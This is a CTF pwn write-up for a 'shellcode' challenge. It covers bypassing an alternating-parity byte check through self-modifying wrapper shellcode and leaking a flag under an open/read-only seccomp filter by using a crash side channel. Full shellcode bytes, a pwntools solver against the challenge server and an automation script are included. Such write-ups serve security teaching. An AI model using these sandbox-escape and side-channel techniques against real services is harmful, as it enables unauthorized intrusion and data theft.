# shellcode

Category: `pwn`

Points: `261`

Solves: 32

Description:

> Please bypass checker.

---

## Part I

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int i; // [rsp+0h] [rbp-10h]
  int v5; // [rsp+4h] [rbp-Ch]
  void *buf; // [rsp+8h] [rbp-8h]

  sub_1249(a1, a2, a3);
  puts("Please input your shellcode: ");
  buf = mmap(0LL, 0x1000uLL, 7, 34, 0, 0LL);
  sub_1290();
  v5 = read(0, buf, 0x200uLL);
  for ( i = 0; i < v5; ++i )
  {
    if ( (char)(*((char *)buf + i) % 2) != i % 2 )
      return 0xFFFFFFFFLL;
  }
  ((void (*)(void))buf)();
  return 0LL;
}
```

This looks like a classic shellcode chal. We enter some bytes, the program does some check, and the input shellcode is run.

We look at the `mmap`:

```c
  buf = mmap(0LL, 0x1000uLL, 7, 34, 0, 0LL);
```

The function signature is:

```c
void *mmap(void addr[.length], size_t length, int prot, int flags, int fd, off_t offset);
```

Referencing the flags,

```python
buf = mmap(
    addr=0x0,
    length=0x1000,
    prot=PROT_EXEC|PROT_WRITE|PROT_READ,
    flags=MAP_ANONYMOUS|MAP_PRIVATE,
    fd=0x0,
    offset=0x0
)
```

Basically we are given a free `rwx` region of `0x1000` bytes to play with.

Now the `seccomp`:

```c
__int64 sub_1290()
{
  __int64 result; // rax
  __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = seccomp_init(0LL);
  seccomp_rule_add(v1, 2147418112LL, 2LL, 0LL);
  seccomp_rule_add(v1, 2147418112LL, 0LL, 0LL);
  result = seccomp_load(v1);
  if ( (int)result < 0 )
  {
    perror("seccomp_load failed");
    exit(1);
  }
  return result;
}
```

The function signatures are:

```c
scmp_filter_ctx seccomp_init(uint32_t def_action);
```

```c
int seccomp_rule_add(scmp_filter_ctx ctx, uint32_t action, int syscall, unsigned int arg_cnt, ...);
```

Referencing the flags,

```python
v1 = seccomp_init(
    def_action=SCMP_ACT_KILL
)
seccomp_rule_add(
    ctx=v1,
    action=SCMP_ACT_ALLOW,
    syscall=SYSCALL_OPEN,
    arg_cnt=0x0
)
seccomp_rule_add(
    ctx=v1,
    action=SCMP_ACT_ALLOW,
    syscall=SYSCALL_READ,
    arg_cnt=0x0
)
```

Alternatively, we can use `seccomp-tools` to analyse the binary:

```
$ seccomp-tools dump ./shellcode
Please input your shellcode:
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
 0005: 0x15 0x01 0x00 0x00000000  if (A == read) goto 0007
 0006: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
```

Basically, we are only allowed `read` and `open`. Not even `write`! We will figure that out later, but first we have to bypass the check.

---

## Part II

```c
  v5 = read(0, buf, 0x200uLL);
  for ( i = 0; i < v5; ++i )
  {
    if ( (char)(*((char *)buf + i) % 2) != i % 2 )
      return 0xFFFFFFFFLL;
  }
```

This looks... pretty cursed. The shellcode bytes have to alternate between even and odd values. **Not only that,** because of C signed representation shenanigans, odd bytes cannot have MSB set (i.e. must be `< 0x80`).

Obviously, trying to come up with some elaborate shellcode to solve directly under this restriction is insanely difficult. Instead we attempt to bypass this restriction to make our lives easier.

```
gef➤  b *0x55555555535a
Breakpoint 1 at 0x55555555535a
gef➤  b *0x5555555553d5
Breakpoint 2 at 0x5555555553d5
gef➤  r
...
$rax   : 0x007ffff7fc2000  →  0x0000000000000000
...
   0x555555555355                  call   0x555555555110 <mmap@plt>
●→ 0x55555555535a                  mov    QWORD PTR [rbp-0x8], rax
...
gef➤  c
Continuing.
01
...
$rax   : 0x007ffff7fc2000  →  0x000000000a3130 ("01\n"?)
...
$rsi   : 0x007ffff7fc2000  →  0x000000000a3130 ("01\n"?)
...
●→ 0x5555555553d5                  call   rax
...
```

We note that the address of our shellcode is stored in both `rax` and `rsi`, which will come in handy later.

The fastest way to bypass the restriction is simply to procure another read. As the segment has `rwx` enabled, we can practically do whatever we want. For instance, we can attempt to read to the same address as our initial buffer, this time without checks as the program will simply continue executing where it left off.

As an example, the shellcode begins executing at 0x1234:

```
90 90 90 90 0f 05 90 90 90 90
```

(The `nop`s are placeholder bytes that would theoretically pass the check restriction.)

Before the syscall (`0f 05`), supposed it has already been populated (through the initial read) with the right wrapper shellcode that gets us

```c
read(0, 0x1234, 0x100)
```

The `read` `syscall` then executes, this time allowing us to fill the buffer with our *actual* shellcode.

```
41 41 41 41 41 41 80 81 82 83
```

Then the program execution continues, starting at where it left off (`80`).

A working wrapper shellcode is thus:

```asm
xor rax, rax
push rcx
mov edx, 0x10001
push rcx
push rsi
pop rbx
inc byte ptr [rbx+0x10]
0f 04 (bad)
push rcx
```

```
48 31 C0 51 BA 01 00 01 00 51 56 5B FE 43 10 0F 04 51
```

Note that this wrapper shellcode is slightly convoluted as we still have to bypass the initial check. The `push rcx` is an odd `nop` substitute.

We cannot directly pass in the `syscall` bytes as both bytes are odd. Instead we have to introduce a workaround to increment one of the bytes from within the shellcode itself (`04` in this case). The shellcode address is saved in `rax` and `rsi` so we could use either to work out the patch location.

After this, we get a normal read, and we can proceed on with our main shellcode.

---

## Part III

The rest is pretty straightforward, mostly following standard `orw`. The difference is of course there is no `w`, so how are we supposed to display the flag?

We can brute the flag by abusing `read`. For each byte in the flag, we read from an input and check if the first input byte is less than the flag byte. If not, the system crashes itself.

With this, we can send in byte by byte in ascending order until the system crashes; the smallest byte that induces a crash shall be the flag byte.

```asm
mov rax, 0x67616c662f2e
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
xor rax, rax
mov al, 2
syscall

mov rdi, rax
mov dl, 0x40
mov rsi, rsp
mov al, 0
syscall

add rsi, 0     ; replace with flag idx
xor rbx, rbx
mov bl, [rsi]

xor rdi, rdi
mov dl, 2

mov al, 0
syscall
xor rcx, rcx
mov cl, [rsi]
cmp bl, cl
jg 0           ; replace with 0xffffffef

mov al, 1
syscall
```

```
48 B8 2E 2F 66 6C 61 67 00 00 50 48 89 E7 48 31 F6 48 31 D2 48 31 C0 B0 02 0F 05 48 89 C7 B2 40 48 89 E6 B0 00 0F 05 48 83 C6[00]48 31 DB 8A 1E 48 31 FF B2 02 B0 00 0F 05 48 31 C9 8A 0E 38 CB 0F 8F EF FF FF FF B0 01 0F 05
```

The marked byte above controls the index of the flag we want to enumerate.

Testing it out:

```python
from pwn import *

e = context.binary = ELF('./shellcode')
p = e.process() if not args.REMOTE else remote('chall.geekctf.geekcon.top', 40245)

SHELLCODE1 = b'\x48\x31\xC0\x51\xBA\x01\x00\x01\x00\x51\x56\x5B\xFE\x43\x10\x0F\x04\x51'
SHELLCODE2_HEAD = b'\x48\xB8\x2E\x2F\x66\x6C\x61\x67\x00\x00\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\xB0\x02\x0F\x05\x48\x89\xC7\xB2\x40\x48\x89\xE6\xB0\x00\x0F\x05\x48\x83\xC6'
SHELLCODE2_TAIL = b'\x48\x31\xDB\x8A\x1E\x48\x31\xFF\xB2\x02\xB0\x00\x0F\x05\x48\x31\xC9\x8A\x0E\x38\xCB\x0F\x8F\xEF\xFF\xFF\xFF\xB0\x01\x0F\x05'

p.sendlineafter(b'shellcode: ', SHELLCODE1)
p.sendline(b'\0'*0x11 + SHELLCODE2_HEAD + bytes([int(input())]) + SHELLCODE2_TAIL)

p.interactive()
```

```
$ python3 solve.py
[*] '[REDACTED]/shellcode'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '[REDACTED]/shellcode': pid 764
0
[*] Switching to interactive mode

$ a
$ b
$ c
$ d
$ e
$ f
[*] Got EOF while reading in interactive
```

```
$ python3 solve.py
[*] '[REDACTED]/shellcode'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '[REDACTED]/shellcode': pid 772
1
[*] Switching to interactive mode

$ a
$ b
$ c
...
$ j
$ k
$ l
[*] Got EOF while reading in interactive
```

With this, we are ready to automate it on remote!

```python
from subprocess import Popen, PIPE
import time

fw = open('tmpout', 'wb')
fr = open('tmpout', 'rb')

for idx in range(40):
    p = Popen(
        ['python3', 'solve.py', 'REMOTE'],
        stdin=PIPE,
        stdout=fw,
        stderr=fw
    )
    p.stdin.write(f'{idx}\n'.encode())
    time.sleep(1)
    assert b'Done' in (tmp := fr.read()), tmp
    for i in range(48, 127):
        p.stdin.write(f'{chr(i)}\n'.encode())
        p.stdin.flush()
        time.sleep(0.1)
        if b'EOF' in fr.read():
            print(chr(i), end='', flush=True)
            break
    p.kill()

fw.close()
fr.close()
```

```
flag{practice_handwrite_shellcode}
```
